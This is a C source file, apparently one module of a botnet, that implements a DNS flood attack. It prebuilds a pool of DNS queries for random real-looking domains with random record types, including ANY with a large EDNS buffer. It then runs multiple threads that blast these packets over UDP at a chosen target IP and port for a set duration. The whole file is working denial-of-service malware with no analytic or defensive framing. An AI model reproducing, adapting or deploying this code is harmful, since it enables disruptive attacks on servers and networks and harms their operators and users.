#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static const char *dns_tlds[] = {"com","net","org","ru","de","uk","xyz"};
static const char *dns_domains[] = {
    "google","cloudflare","amazon","microsoft","facebook","apple",
    "netflix","github","digitalocean","linode","heroku","mysql",
    "nginx","apache","debian","ubuntu","centos","docker","kubernetes",
    "python","node","golang","rust","java","oracle","cisco","vmware",
    "adobe","paypal","shopify","wordpress","wikipedia","reddit",
    "stackoverflow","linkedin","dropbox","telegram","instagram",
    "spotify","slack","zoom","mongodb","redis","grafana","splunk",
    "atlassian","jira","vercel","netlify"
};
#define DNS_DOMAIN_COUNT 49

static void dns_name_encode(uint8_t *out, int *olen, const char *name) {
    int pos = 0;
    while (*name) {
        const char *dot = strchr(name, '.');
        int len = dot ? (int)(dot - name) : (int)strlen(name);
        if (len > 63) len = 63;
        out[pos++] = (uint8_t)len;
        memcpy(out+pos, name, len);
        pos += len;
        name = dot ? dot + 1 : name + strlen(name);
    }
    out[pos++] = 0;
    *olen = pos;
}

static int build_dns_packet(uint8_t *pkt, XorShift64 *rng) {
    const char *tld = dns_tlds[rng_next(rng) % 7];
    const char *d1 = dns_domains[rng_next(rng) % DNS_DOMAIN_COUNT];
    const char *d2 = dns_domains[rng_next(rng) % DNS_DOMAIN_COUNT];
    char domain[256];
    snprintf(domain, sizeof(domain), "%s.%s.%s", d2, d1, tld);
    uint16_t qtype[] = {1, 15, 16, 28, 99, 255};
    uint16_t qt = qtype[rng_next(rng) % 6];
    uint8_t enc[256];
    int elen;
    dns_name_encode(enc, &elen, domain);
    int off = 0;
    uint16_t id = (uint16_t)rng_next(rng);
    pkt[off++] = id>>8; pkt[off++] = id;
    pkt[off++] = 0x01; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    memcpy(pkt+off, enc, elen); off += elen;
    pkt[off++] = qt>>8; pkt[off++] = qt;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 41;
    pkt[off++] = 0x10; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    return off;
}

static uint8_t dns_pool[64][512];
static int dns_pool_lens[64];
static int dns_pool_init = 0;
static pthread_mutex_t dns_pool_lock = PTHREAD_MUTEX_INITIALIZER;

static void init_dns_pool(void) {
    pthread_mutex_lock(&dns_pool_lock);
    if (dns_pool_init) { pthread_mutex_unlock(&dns_pool_lock); return; }
    XorShift64 *rng = rng_new();
    for (int i = 0; i < 64; i++)
        dns_pool_lens[i] = build_dns_packet(dns_pool[i], rng);
    free(rng);
    dns_pool_init = 1;
    pthread_mutex_unlock(&dns_pool_lock);
}

void *dns_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    int check = 1000;
    int idx = 0;
    time_t end = time(NULL) + t->sec;
    while (running) {
        if (--check <= 0) { if (time(NULL) >= end) break; check = 1000; }
        sendto(fd, dns_pool[idx%64], dns_pool_lens[idx%64], 0, (struct sockaddr*)&addr, sizeof(addr));
        idx++;
    }
    close(fd);
    return NULL;
}

void flood_dns(const char *target, int port, int sec) {
    init_dns_pool();
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, dns_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
